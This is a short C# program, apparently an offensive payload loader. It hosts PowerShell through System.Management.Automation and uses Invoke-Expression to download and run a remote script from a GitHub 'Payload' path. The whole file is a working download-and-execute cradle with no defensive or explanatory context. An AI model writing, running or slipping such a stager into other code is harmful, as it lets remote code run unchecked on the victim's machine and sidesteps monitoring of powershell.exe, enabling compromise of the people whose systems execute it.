using System;
using System.Management.Automation;
namespace Powershell
{
    class Program
    {
        static void Main(string[] args)
        {
            PowerShell ps = PowerShell.Create();
            ps.AddCommand("Invoke-Expression");
            ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp2Powershell/Csharp2Powershell.ps1')");
            ps.Invoke();
        }
    }
}